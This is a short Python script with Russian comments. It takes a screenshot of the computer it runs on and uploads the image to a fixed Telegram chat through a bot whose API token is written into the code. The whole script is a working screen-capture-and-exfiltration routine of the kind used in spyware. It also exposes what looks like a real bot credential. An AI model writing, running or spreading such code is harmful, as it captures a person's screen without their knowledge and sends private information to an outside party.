import telebot
import pyautogui

bot = telebot.TeleBot("7375098459:AAELh2n9TTUrxWPdDd-9cJ2FB_LRfEi4y4o")
CHAT_ID = 5843796841  

# Делаем скриншот
screenshot = pyautogui.screenshot()
path = "screenshot.png"
screenshot.save(path)

# Отправляем скриншот
with open(path, 'rb') as photo:
    bot.send_photo(CHAT_ID, photo, caption="📸 Скриншот экрана")